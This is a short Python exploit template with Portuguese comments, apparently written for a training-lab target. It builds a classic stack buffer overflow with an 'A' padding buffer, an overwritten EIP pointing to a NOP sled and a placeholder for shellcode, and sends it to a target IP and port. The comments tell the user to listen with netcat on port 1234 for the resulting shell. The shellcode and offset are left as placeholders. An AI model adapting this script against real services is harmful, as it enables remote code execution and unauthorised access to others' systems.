#insira o endereco Nop verificado na variavel eip no local indicado

#na maquina local abra o netcat escutando na porta 1234

import socket
from struct import pack

IP = "10.129.43.23" #altere para o ip da maquina alvo
port = 21449 #altere para a porta do servico


def exploit():
    
    buf =  "<inisra aqui o exploit>"

    offset = valor do eip - 124 - tamanho do exploit - 4
    buffer = b"A"*offset
    eip = pack('<L', <endereco NOP AQUI>)
    nop = b"\x90" * 124
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()
exploit()
